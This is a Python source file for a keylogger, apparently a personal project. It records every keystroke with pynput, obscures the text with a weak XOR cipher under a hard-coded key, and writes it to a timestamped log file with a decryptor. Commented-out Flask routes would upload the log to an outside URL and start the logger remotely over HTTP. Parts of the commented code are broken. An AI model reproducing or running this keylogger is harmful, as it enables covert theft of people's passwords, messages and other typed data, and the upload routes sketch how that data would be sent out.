import base64
from datetime import datetime
import threading
from threading import Thread
from pynput import keyboard
import time

from flask import Flask, request
import requests

# app = Flask(_name_)

# url = "https://example.com/upload"

# @app.route('/get_file', methods=['GET'])
# def upload_file():
#     with open("encrypted_logs.txt", "rb") as f:
#         encoded_content = base64.b64encode(f.read()).decode("utf-8")
#     data = {"filename": "encrypted_logs.txt", "content": encoded_content}
#     headers = {"Content-Type": "application/json"}
#     response = requests.post(url, json=data, headers=headers)
#     print(response.text)
#     return 'Data received', 200


# @app.route('/time_to_run/<value>', methods=['GET'])
# def process(value):
#     print(value)
#     KeyLogger(int(value)).stop_after_time()
#     return "KeyLogger started listening", 200


ENCRYPTED_LOG_FILE = "encrypted_logs.txt"
ENCRYPTION_KEY = "613".encode('utf-8')


class KeyLogger:
    def __init__(self, routing: str = 'file'):
        self.routing = routing
        self.current_keys = []
        self.lock = threading.Lock()
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.stop_event = False

    def start(self, time_to_run: int = 0):
        self.listener.start()
        if time_to_run <= 0:
            while not self.stop_event:
                time.sleep(60)
                self.save_and_clear()
        else:
            for _ in range(time_to_run):
                time.sleep(60)
                self.save_and_clear()
            self.listener.stop()
            return

    def on_press(self, key):
        with self.lock:
            try:
                key_str = self.format_key(key)
                if key_str:
                    self.current_keys.append(key_str)
            except Exception as e:
                print(f"Error handling key: {e}")

    def format_key(self, key):
        """Format special keys and characters."""
        if key == keyboard.Key.space:
            return ' '
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        return f"[{key.name}]"

    def save_and_clear(self):
        keys_copy = []
        with self.lock:
            keys_copy = self.current_keys.copy()
            self.current_keys.clear()
        keys_str = ''.join(keys_copy)
        Manager.encrypt(keys_str)
        # save for letter
        # if keys_copy:
        #     if self.routing == 'file':
        #         Writer().add_writing(keys_copy)
        #     elif self.routing == 'server':
        #         Writer().write_to_server()

    def stop_listen(self):
        self.listener.stop()
        self.stop_event = True

    def routing_to_save(self, route):
        if route == 'server':
            self.routing = route


class Writer:
    @classmethod
    def add_writing(cls, encrypted_content: str):
        log_time = datetime.now().strftime("%d/%m/%Y %H:%M")
        with open(ENCRYPTED_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{log_time}] {encrypted_content}\n")

    def write_to_server(self):
        pass


class EncryptorDecryptor:
    @staticmethod
    def encrypt(data: str) -> str:
        """Encrypt data using XOR cipher and return base64 string."""
        data_bytes = data.encode('utf-8')
        encrypted = bytes([data_bytes[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]
                           for i in range(len(data_bytes))])
        return base64.b64encode(encrypted).decode('utf-8')

    @staticmethod
    def decrypt(encrypted_b64: str) -> str:
        """Decrypt base64 encoded encrypted string."""
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            decrypted = bytes([encrypted_data[i] ^ ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]
                               for i in range(len(encrypted_data))])
            return decrypted.decode('utf-8', errors='replace')
        except Exception as e:
            print(f"Decryption error: {e}")
            return ""


class Manager:
    def __init__(self):
        self.key_logger = KeyLogger()
        self.threading_start = threading.Thread(target=self.thread_start)
        self.threading_run_time = None

    def stop(self):
        self.key_logger.stop_listen()

    def start(self):
        self.threading_start.start()

    def thread_start(self):
        self.key_logger.start()  # returns on a

    def run_time(self, timer: int):
        self.threading_run_time = threading.Thread(target=self.thread_run_time, args=(timer,))
        self.threading_run_time.start()

    def thread_run_time(self, timer: int):
        self.key_logger.start(timer)

    @staticmethod
    def encrypt(data: str):
        encrypted_string = EncryptorDecryptor.encrypt(data)
        Writer.add_writing(encrypted_string)

    @staticmethod
    def decrypt_log_file():
        """Decrypt and display log file contents."""
        try:
            with open(ENCRYPTED_LOG_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue

                    timestamp_end = line.find(']')
                    if timestamp_end == -1:
                        continue

                    encrypted_content = line[timestamp_end + 2:].strip()
                    decrypted = EncryptorDecryptor.decrypt(encrypted_content)
                    print(f"{line[:timestamp_end + 1]} {decrypted}")
        except FileNotFoundError:
            print("Log file not found!")

    @staticmethod
    def write(encrypted_string):
        Writer.add_writing(encrypted_string)

    def route(self, routing='file'):
        self.key_logger.routing_to_save(routing)


# if _name_ == '_main_':
# app.run(host='0.0.0.0', port=5000)
#
# m = Manager()
# m.run_time(1)

# m.stop()
Manager.decrypt_log_file()
#
# KeyLogger(10).stop_after_time()
#
# decrypt = input("Decrypt the file? (y/n): ")
# if decrypt.lower() == 'y':
#     EncryptorDecryptor.decrypt("encrypted_logs.txt")
